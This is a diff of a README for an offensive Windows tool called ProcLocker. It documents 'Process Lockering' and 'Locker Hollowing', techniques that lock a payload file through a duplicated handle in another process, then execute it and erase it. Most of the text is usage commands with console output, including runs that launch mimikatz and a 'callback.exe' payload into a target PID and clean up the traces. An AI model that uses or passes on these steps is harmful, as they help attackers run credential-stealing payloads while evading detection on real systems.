@@ -91,10 +91,10 @@ Locker Hollowing is a hybrid between Process Hollowing and Process Lockering.
 
 ![LockerHollowing](img/LockerHollowing.png)
 
-Locker Hollowing
+Process Lockering
 
 ```
-.\ProcLocker.exe locker process mimikatz.exe 19408 auto
+cmd> .\ProcLocker.exe locker process mimikatz.exe 19408 auto
 [+] Created temp file: C:\Users\xxx\AppData\Local\Temp\TH82F6.tmp
 [+] Written!
 [+] Duplicating file handle to 19408
@@ -103,7 +103,16 @@ Locker Hollowing
 [+] Done!
 ```
 
-First "lock" the payload by duplicating file handle to a running process. Then map the payload from the "locked" file and execute it. Finally, clean up the "locked" payload.
+Locker Hollowing
+
+```
+cmd> .\ProcLocker.exe locker hollow callback.exe 19408 auto
+```
+
+Or we can split the step into: 
+1. "lock" the payload by duplicating file handle to a running process. 
+2. map the payload from the "locked" file and execute it. 
+3. clean up the "locked" payload.
 
 ```
 cmd> .\ProcLocker.exe lock mimikatz.exe 19408
@@ -119,7 +128,7 @@ cmd> .\ProcLocker.exe locker process TH1827.tmp 19408 exec
 [+] Process created! Pid = 12080
 [+] Done!
 
-.\ProcLocker.exe clear TH1827.tmp 19408 
+cmd> .\ProcLocker.exe clear TH1827.tmp 19408 
 [+] Getting system handle list
 [+] Found remote file handle of "\Users\xxx\AppData\Local\Temp\TH1827.tmp"
 [+] Duplicating file handle to current process
